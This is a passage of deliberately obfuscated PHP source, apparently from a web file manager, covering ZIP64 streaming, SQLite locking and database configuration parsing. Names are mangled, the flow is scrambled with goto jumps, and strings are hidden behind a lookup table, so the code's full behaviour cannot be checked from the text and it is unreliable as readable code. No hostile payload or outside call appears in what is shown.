¹«æÍÈ); goto FêéÑÊ¡ˆ ; FêéÑÊ¡ˆ : return $aÔ®¡Ğõ‰«; goto fÅéì„µª•; fÅéì„µª•: } public static function fileName() { goto c˜½“Íùë²; eØÒêĞ†ê: if (!empty($_FILES)) { $Eõë‡éÏÜŞ = $Eõë‡éÏÜŞ ? $Eõë‡éÏÜŞ : $_FILES[$b”—†­Ê÷ø[164]][$b”—†­Ê÷ø[383]]; } $Eõë‡éÏÜŞ = str_replace(array($b”—†­Ê÷ø[95], $b”—†­Ê÷ø[8]), array($b”—†­Ê÷ø[8], $b”—†­Ê÷ø[93]), trim($Eõë‡éÏÜŞ)); if (!is_wap()) { return $Eõë‡éÏÜŞ; } goto B‹„ó»¦àŞ; B‹„ó»¦àŞ: $fİ»Ê…ö¸Ş = strtotime($in[$b”—†­Ê÷ø[1967]]); $fİ»Ê…ö¸Ş = $fİ»Ê…ö¸Ş ? $fİ»Ê…ö¸Ş : time(); $eğ¨‰ÄØ‘‰ = strtolower($Eõë‡éÏÜŞ); goto DàÎÈåº’®; c˜½“Íùë²: $b”—†­Ê÷ø =& $_SERVER[¢à]; global $in; $Eõë‡éÏÜŞ = isset($in[$b”—†­Ê÷ø[28]]) ? $in[$b”—†­Ê÷ø[28]] : $b”—†­Ê÷ø[33]; goto eØÒêĞ†ê; DàÎÈåº’®: if ($eğ¨‰ÄØ‘‰ == $b”—†­Ê÷ø[1968] || $eğ¨‰ÄØ‘‰ == $b”—†­Ê÷ø[1969]) { $Eõë‡éÏÜŞ = date($b”—†­Ê÷ø[690], $fİ»Ê…ö¸Ş) . $b”—†­Ê÷ø[70] . $in[$b”—†­Ê÷ø[77]] . $b”—†­Ê÷ø[1600]; } else { if ($eğ¨‰ÄØ‘‰ == $b”—†­Ê÷ø[1970]) { $Eõë‡éÏÜŞ = date($b”—†­Ê÷ø[690], $fİ»Ê…ö¸Ş) . $b”—†­Ê÷ø[70] . $in[$b”—†­Ê÷ø[77]] . $b”—†­Ê÷ø[1971]; } } return $Eõë‡éÏÜŞ; goto B×áÖ¸ùà; B×áÖ¸ùà: } private function errorInfo($b›‡øÔ¸) { $f§•Ş³¿Õ† =& $_SERVER[¢à]; $F¦ğÆÅêê¿ = array($f§•Ş³¿Õ†[1972], $f§•Ş³¿Õ†[1973], $f§•Ş³¿Õ†[1974], $f§•Ş³¿Õ†[1975], $f§•Ş³¿Õ†[1976], $f§•Ş³¿Õ†[1977], $f§•Ş³¿Õ†[1978], $f§•Ş³¿Õ†[1979]); return $b›‡øÔ¸ . $f§•Ş³¿Õ†[4] . $F¦ğÆÅêê¿[$b›‡øÔ¸]; } } class ZipMake { const VERSION = "\x30\56\x32\56\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($f…İøßÀ§Â = null) { $c·óÀ§°© =& $_SERVER[¢à]; $this->outputStream = fopen($c·óÀ§°©[1980], $c·óÀ§°©[1215]); $this->outputName = $f…İøßÀ§Â; $this->needHeaders = !0; } public function addFile($aÊ¡ÍÔË¬¿, $Cö…Ôæ¾ãò) { goto A™ªöÜœ™»; A™ªöÜœ™»: $dõ¨£¦Ñö… =& $_SERVER[¢à]; $aÊ¡ÍÔË¬¿ = $this->filterFilename($aÊ¡ÍÔË¬¿); $C¿£Ÿµ…Ğ… = static::METHOD_STORE; goto e«—£Óù‚¸; aõ¤œÃÀŠ: $this->addFileFooter($aÊ¡ÍÔË¬¿, $C¿£Ÿµ…Ğ…, $eŠÒ¦õ¹¨—, $c³Ë¾Ê°Û‡, $b—„«¿, $E‘¥ˆÕ¢ñ½); goto B°ƒÆÁÂ’; e«—£Óù‚¸: $E‘¥ˆÕ¢ñ½ = $this->addFileHeader($aÊ¡ÍÔË¬¿, $C¿£Ÿµ…Ğ…); $c³Ë¾Ê°Û‡ = $b—„«¿ = filesize($Cö…Ôæ¾ãò); $F«À½ÕÜ = fopen($Cö…Ôæ¾ãò, $dõ¨£¦Ñö…[1981]); goto aŠµÊŒÑ©„; aŠµÊŒÑ©„: while (!feof($F«À½ÕÜ)) { $eÁ­–”Ô÷ = fread($F«À½ÕÜ, 1048576); $this->send($eÁ­–”Ô÷); } fclose($F«À½ÕÜ); $eŠÒ¦õ¹¨— = hexdec(hash_file($dõ¨£¦Ñö…[1982], $Cö…Ôæ¾ãò)); goto aõ¤œÃÀŠ; B°ƒÆÁÂ’: } public function addFileFromStream($c—¹ñæˆã‰, $a¸òÕº›¨è) { goto DÉ¸ŸëËö¹; F»ÉØëà‚’: $this->addFileFooter($c—¹ñæˆã‰, $BçÅÏëÏæ±, $Cƒ§Äà›, $Eºß—†êà, $f‡ÛµÒ®á±, $càù©‘„Íğ); goto EàĞµ«­ÈÂ; C¸¦å³İÎÏ: fseek($a¸òÕº›¨è, 0, SEEK_END); $Eºß—†êà = $f‡ÛµÒ®á± = ftell($a¸òÕº›¨è); rewind($a¸òÕº›¨è); goto cŒ†÷…ÒÈÜ; cŒ†÷…ÒÈÜ: $Dğé×‘›ÆÑ = hash_init($_SERVER[¢à][1982]); while (!feof($a¸òÕº›¨è)) { $Cæ÷È«ÒÎ = fread($a¸òÕº›¨è, 1048576); hash_update($Dğé×‘›ÆÑ, $Cæ÷È«ÒÎ); $this->send($Cæ÷È«ÒÎ); } $Cƒ§Äà› = hexdec(hash_final($Dğé×‘›ÆÑ)); goto F»ÉØëà‚’; DÉ¸ŸëËö¹: $c—¹ñæˆã‰ = $this->filterFilename($c—¹ñæˆã‰); $BçÅÏëÏæ± = static::METHOD_STORE; $càù©‘„Íğ = $this->addFileHeader($c—¹ñæˆã‰, $BçÅÏëÏæ±); goto C¸¦å³İÎÏ; EàĞµ«­ÈÂ: } public function finish() { foreach ($this->files as $CË´™ÄóÛ) { $this->addCdrFile($CË´™ÄóÛ); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($C„µºØ¹ , $AÜÎö²¡ï¢) { goto FŠ‡Õ»ñ·; FŠ‡Õ»ñ·: $cÜé¨—ë” =& $_SERVER[¢à]; $C„µºØ¹  = preg_replace($cÜé¨—ë”[1983], $cÜé¨—ë”[33], $C„µºØ¹ ); $e¨Ş†‰¬ä‘ = strlen($C„µºØ¹ ); goto F¿‚Ü­±ğ; AŒ¸Å²Ò©Ş: return strlen($FÜÇ˜ªëÁÆ) + $e¨Ş†‰¬ä‘ + strlen($a¯Áö™ï¦Œ); goto b–ˆõÊŸ»; F¿‚Ü­±ğ: $cÊĞÅ¯Ñ« = $this->dosTime(time()); $F¯É‚ÛÌåË = array(array($cÜé¨—ë”[1984], static::FILE_HEADER_SIGNATURE), array($cÜé¨—ë”[1985], static::ZIP_VERSION_64), array($cÜé¨—ë”[1985], 8), array($cÜé¨—ë”[1985], $AÜÎö²¡ï¢), array($cÜé¨—ë”[1984], $cÊĞÅ¯Ñ«), array($cÜé¨—ë”[1984], 0), array($cÜé¨—ë”[1984], 4294967295), array($cÜé¨—ë”[1984], 4294967295), array($cÜé¨—ë”[1985], $e¨Ş†‰¬ä‘), array($cÜé¨—ë”[1985], 32)); $f†•µ“÷¢ = array(array($cÜé¨—ë”[1985], 1), array($cÜé¨—ë”[1985], 28), array($cÜé¨—ë”[1986], 0), array($cÜé¨—ë”[1986], 0), array($cÜé¨—ë”[1986], 0), array($cÜé¨—ë”[1984], 0)); goto AÈ®‹åßœ—; AÈ®‹åßœ—: $FÜÇ˜ªëÁÆ = $this->packFields($F¯É‚ÛÌåË); $a¯Áö™ï¦Œ = $this->packFields($f†•µ“÷¢); $this->send($FÜÇ˜ªëÁÆ . $C„µºØ¹  . $a¯Áö™ï¦Œ); goto AŒ¸Å²Ò©Ş; b–ˆõÊŸ»: } protected function addFileFooter($d…‰Õ·ëÅ‘, $D÷ˆ½´ÛÄÓ, $Bæçî—¹ßØ, $AÂšÇìÚ‡´, $aÑ¬’÷Óê¯, $c™°‡ÙÒ¨È) { $cÇõˆØ¥×Ø =& $_SERVER[¢à]; $Cà•˜ïò‚ = array(array($cÇõˆØ¥×Ø[1984], static::DATA_DESCRIPTOR_SIGNATURE), array($cÇõˆØ¥×Ø[1984], $Bæçî—¹ßØ), array($cÇõˆØ¥×Ø[1986], $AÂšÇìÚ‡´), array($cÇõˆØ¥×Ø[1986], $aÑ¬’÷Óê¯)); $E¬²‹¢Ä­á = $this->packFields($Cà•˜ïò‚); $this->send($E¬²‹¢Ä­á); $Cìñ’æ ó = $c™°‡ÙÒ¨È + $AÂšÇìÚ‡´ + $aÊÑ¯ÈŞóâ; $this->addToCdr($d…‰Õ·ëÅ‘, $D÷ˆ½´ÛÄÓ, $Bæçî—¹ßØ, $AÂšÇìÚ‡´, $aÑ¬’÷Óê¯, $Cìñ’æ ó); } private function addToCdr($Bß¬·ö²¤õ, $B¿ƒÂÏÃØã, $aÊŞ•òğù—, $CÏÛ×‚Ûã, $a’ŠóÏ½æ, $dàë–µ¸â„) { $this->files[] = array($Bß¬·ö²¤õ, $B¿ƒÂÏÃØã, $aÊŞ•òğù—, $CÏÛ×‚Ûã, $a’ŠóÏ½æ, $this->ofs); $this->ofs += $dàë–µ¸â„; } protected function addCdrFile($Cá”à±“†Í) { goto aªìáöÀáÎ; dæ¡‡·¡Î: $CíÏÔ²‚§ù = $this->packFields($Eˆ„¶¹µ´„); $BÔÕÒ·µ…ö = $this->packFields($D¼…£–õÆç); $aœê™¹½ÎÌ = $CíÏÔ²‚§ù . $fø¿ÛØ—… . $A»Ÿ•„ Ìˆ . $BÔÕÒ·µ…ö; goto eÕš¢Òˆ›â; aªìáöÀáÎ: $F°æÒàøï‡ =& $_SERVER[¢à]; list($fø¿ÛØ—…, $B„®ÒÈ‚¤, $cß‰¹Ó µ, $f«»ÅÈŒ®‹, $c‘’Ì‡™Æ¢, $E††Ï—‹„º) = $Cá”à±“†Í; $A»Ÿ•„ Ìˆ = $F°æÒàøï‡[33]; goto c‘Å‹ÖŠ¬Î; c‘Å‹ÖŠ¬Î: $EŸÀÉó‚¢˜ = $this->dosTime(time()); $Eˆ„¶¹µ´„ = array(array($F°æÒàøï‡[1984], static::CDR_FILE_SIGNATURE), array($F°æÒàøï‡[1985], static::ZIP_VERSION_64), array($F°æÒàøï‡[1985], static::ZIP_VERSION_64), array($F°æÒàøï‡[1985], 8), array($F°æÒàøï‡[1985], $B„®ÒÈ‚¤), array($F°æÒàøï‡[1984], $EŸÀÉó‚¢˜), array($F°æÒàøï‡[1984], $cß‰¹Ó µ), array($F°æÒàøï‡[1984], 4294967295), array($F°æÒàøï‡[1984], 4294967295), array($F°æÒàøï‡[1985], strlen($fø¿ÛØ—…)), array($F°æÒàøï‡[1985], 32), array($F°æÒàøï‡[1985], strlen($A»Ÿ•„ Ìˆ)), array($F°æÒàøï‡[1985], 0), array($F°æÒàøï‡[1985], 0), array($F°æÒàøï‡[1984], 32), array($F°æÒàøï‡[1984], 4294967295)); $D¼…£–õÆç = array(array($F°æÒàøï‡[1985], 1), array($F°æÒàøï‡[1985], 28), array($F°æÒàøï‡[1986], $c‘’Ì‡™Æ¢), array($F°æÒàøï‡[1986], $f«»ÅÈŒ®‹), array($F°æÒàøï‡[1986], $E††Ï—‹„º), array($F°æÒàøï‡[1984], 0)); goto dæ¡‡·¡Î; eÕš¢Òˆ›â: $this->send($aœê™¹½ÎÌ); $this->cdr_ofs += strlen($aœê™¹½ÎÌ); goto CÇãôªÛŒ“; CÇãôªÛŒ“: } protected function addCdr64Eof() { goto Dª‰éŒ½¤ç; aôèßÔ ãñ: $this->send($eÄÔçß÷ß‹); goto dˆ‰·ËØä; eÀèßÊ˜§ï: $B†”‡Ô­è… = $this->ofs; $bãï”©…†Ä = array(array($f®¦ç·–•ô[1984], static::ZIP64_CDR_EOF_SIGNATURE), array($f®¦ç·–•ô[1986], 44), array($f®¦ç·–•ô[1985], static::ZIP_VERSION_64), array($f®¦ç·–•ô[1985], static::ZIP_VERSION_64), array($f®¦ç·–•ô[1984], 0), array($f®¦ç·–•ô[1984], 0), array($f®¦ç·–•ô[1986], $fì‘ã í‡«), array($f®¦ç·–•ô[1986], $fì‘ã í‡«), array($f®¦ç·–•ô[1986], $eÂğ£¢Åğ), array($f®¦ç·–•ô[1986], $B†”‡Ô­è…)); $eÄÔçß÷ß‹ = $this->packFields($bãï”©…†Ä); goto aôèßÔ ãñ; Dª‰éŒ½¤ç: $f®¦ç·–•ô =& $_SERVER[¢à]; $fì‘ã í‡« = count($this->files); $eÂğ£¢Åğ = $this->cdr_ofs; goto eÀèßÊ˜§ï; dˆ‰·ËØä: } protected function addCdr64Locator() { goto fíÁØïõó; fíÁØïõó: $B›Ìñ®ÁÍ¡ =& $_SERVER[¢à]; $d¹éµœ³Áó = count($this->files); $d‘ààÓ¡ù’ = $this->cdr_ofs; goto cŠ»¯’²ˆÄ; e³Ä™ƒ¤ƒ: $this->send($A‘Ú¢Ó’¸Õ); goto Dö…Œ›¸ù‹; cŠ»¯’²ˆÄ: $FšâƒğùÔù = $this->ofs; $F«Ÿ†Äî¸ = array(array($B›Ìñ®ÁÍ¡[1984], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($B›Ìñ®ÁÍ¡[1984], 0), array($B›Ìñ®ÁÍ¡[1986], $FšâƒğùÔù + $d‘ààÓ¡ù’), array($B›Ìñ®ÁÍ¡[1984], 1)); $A‘Ú¢Ó’¸Õ = $this->packFields($F«Ÿ†Äî¸); goto e³Ä™ƒ¤ƒ; Dö…Œ›¸ù‹: } protected function addCdrEof() { goto F•‘…°½¸¯; c¢ÚÈ³àÖÜ: $d¦Š‚Ÿƒ…è = $this->ofs; $AÖİ·è–« = $e¢¥‘„Îäã[33]; $fò·õéÔ° = array(array($e¢¥‘„Îäã[1984], static::CDR_EOF_SIGNATURE), array($e¢¥‘„Îäã[1985], 0), array($e¢¥‘„Îäã[1985], 0), array($e¢¥‘„Îäã[1985], $C¹™÷¢¹‚ì), array($e¢¥‘„Îäã[1985], $C¹™÷¢¹‚ì), array($e¢¥‘„Îäã[1984], 4294967295), array($e¢¥‘„Îäã[1984], 4294967295), array($e¢¥‘„Îäã[1985], strlen($AÖİ·è–«))); goto A›¡ïÑ±§¤; A›¡ïÑ±§¤: $aâ½‘ô±¾ = $this->packFields($fò·õéÔ°) . $AÖİ·è–«; $this->send($aâ½‘ô±¾); goto fÏ´õ¤èÎÏ; F•‘…°½¸¯: $e¢¥‘„Îäã =& $_SERVER[¢à]; $C¹™÷¢¹‚ì = count($this->files); $E³©Ù“Í²• = $this->cdr_ofs; goto c¢ÚÈ³àÖÜ; fÏ´õ¤èÎÏ: } protected function addCdr() { foreach ($this->files as $aÕ—…áôË) { $this->addCdrFile($aÕ—…áôË); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $BáŸˆø…® =& $_SERVER[¢à]; $bœ»ÀØ¥éï = $BáŸˆø…®[199]; if ($this->outputName) { $a¸ƒŒáÉë = trim(str_replace(array($BáŸˆø…®[113], $BáŸˆø…®[55], $BáŸˆø…®[95], $BáŸˆø…®[67], $BáŸˆø…®[214], $BáŸˆø…®[988]), $BáŸˆø…®[33], $this->outputName)); $Dáï–óí—‘ = rawurlencode($a¸ƒŒáÉë); $bœ»ÀØ¥éï .= "\x3b\40\146\x69\x6c\145\x6e\141\155\145\x2a\75\x75\164\x66\x2d\70\47\x27{$Dáï–óí—‘}"; } $bŸŠŸ•‘—ä = array($BáŸˆø…®[196] => $BáŸˆø…®[1987], $BáŸˆø…®[1988] => $bœ»ÀØ¥éï, $BáŸˆø…®[1989] => $BáŸˆø…®[1990], $BáŸˆø…®[1991] => $BáŸˆø…®[1992], $BáŸˆø…®[1993] => $BáŸˆø…®[1994]); foreach ($bŸŠŸ•‘—ä as $c‹¤Ô‡ìºˆ => $F—¢‚é¶Äç) { header($c‹¤Ô‡ìºˆ . $BáŸˆø…®[878] . $F—¢‚é¶Äç); } } protected function send($fÈã”¨‹œ•) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $fÈã”¨‹œ•); } protected final function dosTime($fÍêÓ„Õ‡é) { $E•È«À»Ğ™ =& $_SERVER[¢à]; $b£ˆÓ¡â…¤ = getdate($fÍêÓ„Õ‡é); if ($b£ˆÓ¡â…¤[$E•È«À»Ğ™[1697]] < 1980) { $b£ˆÓ¡â…¤ = array($E•È«À»Ğ™[1697] => 1980, $E•È«À»Ğ™[1995] => 1, $E•È«À»Ğ™[1996] => 1, $E•È«À»Ğ™[1997] => 0, $E•È«À»Ğ™[1998] => 0, $E•È«À»Ğ™[1999] => 0); } $b£ˆÓ¡â…¤[$E•È«À»Ğ™[1697]] -= 1980; return $b£ˆÓ¡â…¤[$E•È«À»Ğ™[1697]] << 25 | $b£ˆÓ¡â…¤[$E•È«À»Ğ™[1995]] << 21 | $b£ˆÓ¡â…¤[$E•È«À»Ğ™[1996]] << 16 | $b£ˆÓ¡â…¤[$E•È«À»Ğ™[1997]] << 11 | $b£ˆÓ¡â…¤[$E•È«À»Ğ™[1998]] << 5 | $b£ˆÓ¡â…¤[$E•È«À»Ğ™[1999]] >> 1; } protected function packFields($b‡ ÊŸõ½Ğ) { $Fóß®’«œ =& $_SERVER[¢à]; $FÕ¦«ö‚é = $Fóß®’«œ[33]; $f…ï„Ñ‚Í = array(); foreach ($b‡ ÊŸõ½Ğ as $CÇ³ë‡â¶ó) { $FÕ¦«ö‚é .= $CÇ³ë‡â¶ó[0]; $f…ï„Ñ‚Í[] = $CÇ³ë‡â¶ó[1]; } array_unshift($f…ï„Ñ‚Í, $FÕ¦«ö‚é); return call_user_func_array($Fóß®’«œ[2000], $f…ï„Ñ‚Í); } protected function filterFilename($C‡¥ÚÈƒ÷) { $d±¿ºÌé¶ =& $_SERVER[¢à]; return str_replace(array($d±¿ºÌé¶[95], $d±¿ºÌé¶[4], $d±¿ºÌé¶[173], $d±¿ºÌé¶[69], $d±¿ºÌé¶[113], $d±¿ºÌé¶[923], $d±¿ºÌé¶[926], $d±¿ºÌé¶[268]), $d±¿ºÌé¶[70], $C‡¥ÚÈƒ÷); } } goto dÁİ°ÊÜÎÃ; F ³›ë¡‰: class DbSqlite3 extends DbSqlite3Base { public function query($bÀŒ”¤óß) { goto a±²§óÁç†; a±²§óÁç†: $BÔ¨ÙÈ°ä =& $_SERVER[¢à]; $AŒ¹Åœà‹ = DATA_PATH . $BÔ¨ÙÈ°ä[870]; $eÏâ‹ñëš¬ = fopen($AŒ¹Åœà‹, $BÔ¨ÙÈ°ä[871]); goto fª‘ÊùĞ‹æ; e ²šóñÌ¢: fclose($eÏâ‹ñëš¬); show_json($BÔ¨ÙÈ°ä[872], !1); return !1; goto e·ÓÕ®£ä¢; fª‘ÊùĞ‹æ: if (!$eÏâ‹ñëš¬) { return !1; } if (flock($eÏâ‹ñëš¬, LOCK_EX)) { $C ¹„¼ó°Ò = parent::query($bÀŒ”¤óß); flock($eÏâ‹ñëš¬, LOCK_UN); fclose($eÏâ‹ñëš¬); return $C ¹„¼ó°Ò; } flock($eÏâ‹ñëš¬, LOCK_UN); goto e ²šóñÌ¢; e·ÓÕ®£ä¢: } public function execute($cõÆ°•‘¢ñ) { goto dŠ·÷½êÅ; FˆÏŞ¿­Œ±: fclose($Aæì–óÉÚ£); show_json($c†×áé‡[872], !1); return !1; goto Dô«İ¢Èªš; dŠ·÷½êÅ: $c†×áé‡ =& $_SERVER[¢à]; $cÀ¹µº¥²” = DATA_PATH . $c†×áé‡[870]; $Aæì–óÉÚ£ = fopen($cÀ¹µº¥²”, $c†×áé‡[871]); goto dªÁö…ÏÜ; dªÁö…ÏÜ: if (!$Aæì–óÉÚ£) { return !1; } if (flock($Aæì–óÉÚ£, LOCK_EX)) { $d‰‚¨Ôä†ï = parent::execute($cõÆ°•‘¢ñ); flock($Aæì–óÉÚ£, LOCK_UN); fclose($Aæì–óÉÚ£); return $d‰‚¨Ôä†ï; } flock($Aæì–óÉÚ£, LOCK_UN); goto FˆÏŞ¿­Œ±; Dô«İ¢Èªš: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\x69\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\x71" => "\x3d", "\x6e\x65\161" => "\x3c\76", "\x67\164" => "\76", "\145\x67\164" => "\76\75", "\x6c\x74" => "\x3c", "\x65\154\164" => "\x3c\75", "\156\157\164\154\x69\x6b\x65" => "\x4e\117\124\40\114\111\113\x45", "\154\151\x6b\x65" => "\x4c\x49\113\x45", "\151\156" => "\x49\x4e", "\156\157\164\x69\156" => "\116\117\124\40\x49\116", "\156\x6f\x74\x20\x69\x6e" => "\116\117\x54\40\111\116", "\x62\145\x74\x77\x65\x65\156" => "\102\105\x54\127\105\x45\116", "\156\x6f\164\x62\145\x74\167\145\145\x6e" => "\116\117\124\x20\102\105\x54\x57\x45\105\x4e", "\x6e\157\164\x20\142\145\164\x77\145\x65\156" => "\116\117\124\x20\x42\x45\x54\x57\105\105\116"); protected $selectSql = "\x53\x45\114\105\x43\x54\45\104\111\123\x54\111\x4e\x43\x54\45\x20\45\106\111\x45\114\x44\x25\x20\106\122\x4f\x4d\40\x25\x54\x41\x42\x4c\x45\x25\45\112\117\111\x4e\45\45\x57\x48\105\x52\x45\45\45\107\x52\117\125\x50\45\x25\x48\101\x56\x49\116\x47\45\x25\117\x52\x44\x45\122\45\45\114\x49\x4d\111\x54\45\x20\45\125\116\111\117\x4e\45\x25\x43\x4f\x4d\115\105\116\124\x25"; protected $bind = array(); public static function getInstance() { $fù¨§»¾‚ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¢à][873], $fù¨§»¾‚); } public function factory($FøÊ®„¥§¨ = '') { goto fµ‚Áø›â°; FåïÙ‚ã¡: $this->dbType = ucwords(strtolower($FøÊ®„¥§¨[$bĞãŠæ¬Œ[874]])); $eæÅøÄÑÂ = $bĞãŠæ¬Œ[876] . $this->dbType; if (class_exists($eæÅøÄÑÂ)) { $Bœ‘ ¬òª­ = new $eæÅøÄÑÂ($FøÊ®„¥§¨); if ($bĞãŠæ¬Œ[724] != strtolower($FøÊ®„¥§¨[$bĞãŠæ¬Œ[874]])) { $Bœ‘ ¬òª­->dbType = strtoupper($this->dbType); } else { $Bœ‘ ¬òª­->dbType = $this->_getDsnType($FøÊ®„¥§¨[$bĞãŠæ¬Œ[826]]); } } else { think_exception(think_lang($bĞãŠæ¬Œ[877]) . $bĞãŠæ¬Œ[878] . $eæÅøÄÑÂ); } goto D¿«âààšÌ; fµ‚Áø›â°: $bĞãŠæ¬Œ =& $_SERVER[¢à]; $FøÊ®„¥§¨ = $this->parseConfig($FøÊ®„¥§¨); if (empty($FøÊ®„¥§¨[$bĞãŠæ¬Œ[874]])) { think_exception(think_lang($bĞãŠæ¬Œ[875])); } goto FåïÙ‚ã¡; D¿«âààšÌ: return $Bœ‘ ¬òª­; goto cÀÉ‡“èÓ¯; cÀÉ‡“èÓ¯: } public function __call($f„¢ãµÄ‹Ò, $eÉêÖÃÍ›ï) { if (method_exists($this, $f„¢ãµÄ‹Ò)) { return call_user_func_array(array($this, $f„¢ãµÄ‹Ò), $eÉêÖÃÍ›ï); } } protected function _getDsnType($Bê·ó·äÁ£) { $fš ¿ä¶’ = explode($_SERVER[¢à][4], $Bê·ó·äÁ£); $f÷Ëñ³¬Û = strtoupper(trim($fš ¿ä¶’[0])); return $f÷Ëñ³¬Û; } private function parseConfig($CåçÓÇ = '') { $Ešœ¯‹µÕ =& $_SERVER[¢à]; if (!empty($CåçÓÇ) && is_string($CåçÓÇ)) { $CåçÓÇ = $this->parseDSN($CåçÓÇ); } elseif (is_array($CåçÓÇ)) { $CåçÓÇ = array_change_key_case($CåçÓÇ); $CåçÓÇ = array($Ešœ¯‹µÕ[874] => $CåçÓÇ[$Ešœ¯‹µÕ[723]], $Ešœ¯‹µÕ[799] => $CåçÓÇ[$Ešœ¯‹µÕ[879]], $Ešœ¯‹µÕ[800] => $CåçÓÇ[$Ešœ¯‹µÕ[880]], $Ešœ¯‹µÕ[797] => $CåçÓÇ[$Ešœ¯‹µÕ[881]], $Ešœ¯‹µÕ[798] => $CåçÓÇ[$Ešœ¯‹µÕ[882]], $Ešœ¯‹µÕ[17] => $CåçÓÇ[$Ešœ¯‹µÕ[883]], $Ešœ¯‹µÕ[826] => $CåçÓÇ[$Ešœ¯‹µÕ[725]], $Ešœ¯‹µÕ[13] => isset($CåçÓÇ[$Ešœ¯‹µÕ[884]]) ? $CåçÓÇ[$Ešœ¯‹µÕ[884]] : array()); } elseif (empty($CåçÓÇ)) { if (think_config($Ešœ¯‹µÕ[885]) && $Ešœ¯‹µÕ[724] != strtolower(think_config($Ešœ¯‹µÕ[886]))) { $CåçÓÇ = $this->parseDSN(think_config($Ešœ¯‹µÕ[885])); } else { $CåçÓÇ = array($Ešœ¯‹µÕ[874] => think_config($Ešœ¯‹µÕ[886]), $Ešœ¯‹µÕ[799] => think_config($Ešœ¯‹µÕ[887]), $Ešœ¯‹µÕ[800] => think_config($Ešœ¯‹µÕ[888]), $Ešœ¯‹µÕ[797] => think_config($Ešœ¯‹µÕ[889]), $Ešœ¯‹µÕ[798] => think_config($Ešœ¯‹µÕ[890]), $Ešœ¯‹µÕ[17] => think_config($Ešœ¯‹µÕ[231]), $Ešœ¯‹µÕ[826] => think_config($Ešœ¯‹µÕ[885]), $Ešœ¯‹µÕ[13] => think_config($Ešœ¯‹µÕ[891])); } } return $CåçÓÇ; } protected function initConnect($cÍÖÍˆ—Ú¶ = true) { if (1 == think_config($_SERVER[¢à][18])) { $this->_linkID = $this->multiConnect($cÍÖÍˆ—Ú¶); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($Cç•”›¸‹ = false) { $dÚ´»¥—Åƒ =& $_SERVER[¢à]; static $c“––Í’Èİ = array(); if (empty($c“––Í’Èİ)) { foreach ($this->config as $D£ìñİŞôÙ => $BÄ·——›Ú) { $c“––Í’Èİ[$D£ìñİŞôÙ] = explode($dÚ´»¥—Åƒ[47], $BÄ·——›Ú); } } if (think_config($dÚ´»¥—Åƒ[892])) { if ($Cç•”›¸‹) { $Aëíäˆ‡± = floor(mt_rand(0, think_config($dÚ´»¥—Åƒ[893]) - 1)); } else { if (is_numeric(think_config($dÚ´»¥—Åƒ[894]))) { $Aëíäˆ‡± = think_config($dÚ´»¥—Åƒ[894]); } else { $Aëíäˆ‡± = floor(mt_rand(think_config($dÚ´»¥—Åƒ[893]), count($c“––Í’Èİ[$dÚ´»¥—Åƒ[797]]) - 1)); } } } else { $Aëíäˆ‡± = floor(mt_rand(0, count($c“––Í’Èİ[$dÚ´»¥—Åƒ[797]]) - 1)); } $AŒ½‡´›‘ò = array($dÚ´»¥—Åƒ[799] => isset($c“––Í’Èİ[$dÚ´»¥—Åƒ[799]][$Aëíäˆ‡±]) ? $c“––Í’Èİ[$dÚ´»¥—Åƒ[799]][$Aëíäˆ‡±] : $c“––Í’Èİ[$dÚ´»¥—Åƒ[799]][0], $dÚ´»¥—Åƒ[800] => isset($c“––Í’Èİ[$dÚ´»¥—Åƒ[800]][$Aëíäˆ‡±]) ? $c“––Í’Èİ[$dÚ´»¥—Åƒ[800]][$Aëíäˆ‡±] : $c“––Í’Èİ[$dÚ´»¥—Åƒ[800]][0], $dÚ´»¥—Åƒ[797] => isset($c“––Í’Èİ[$dÚ´»¥—Åƒ[797]][$Aëíäˆ‡±]) ? $c“––Í’Èİ[$dÚ´»¥—Åƒ[797]][$Aëíäˆ‡±] : $c“––Í’Èİ[$dÚ´»¥—Åƒ[797]][0], $dÚ´»¥—Åƒ[798] => isset($c“––Í’Èİ[$dÚ´»¥—Åƒ[798]][$Aëíäˆ‡±]) ? $c“––Í’Èİ[$dÚ´»¥—Åƒ[798]][$Aëíäˆ‡±] : $c“––Í’Èİ[$dÚ´»¥—Åƒ[798]][0], $dÚ´»¥—Åƒ[17] => isset($c“––Í’Èİ[$dÚ´»¥—Åƒ[17]][$Aëíäˆ‡±]) ? $c“––Í’Èİ[$dÚ´»¥—Åƒ[17]][$Aëíäˆ‡±] : $c“––Í’Èİ[$dÚ´»¥—Åƒ[17]][0], $dÚ´»¥—Åƒ[826] => isset($c“––Í’Èİ[$dÚ´»¥—Åƒ[826]][$Aëíäˆ‡±]) ? $c“––Í’Èİ[$dÚ´»¥—Åƒ[826]][$Aëíäˆ‡±] : $c“––Í’Èİ[$dÚ´»¥—Åƒ[826]][0], $dÚ´»¥—Åƒ[13] => isset($c“––Í’Èİ[$dÚ´»¥—Åƒ[13]][$Aëíäˆ‡±]) ? $c“––Í’Èİ[$dÚ´»¥—Åƒ[13]][$Aëíäˆ‡±] : $c“––Í’Èİ[$dÚ´»¥—Åƒ[13]][0]); return $this->connect($AŒ½‡´›‘ò, $Aëíäˆ‡±); } public function parseDSN($CÊ÷ÒÔ’´) { $DïŒ›±ª› =& $_SERVER[¢à]; if (empty($CÊ÷ÒÔ’´)) { return !1; } $FÉ‚ìœØ®Í = 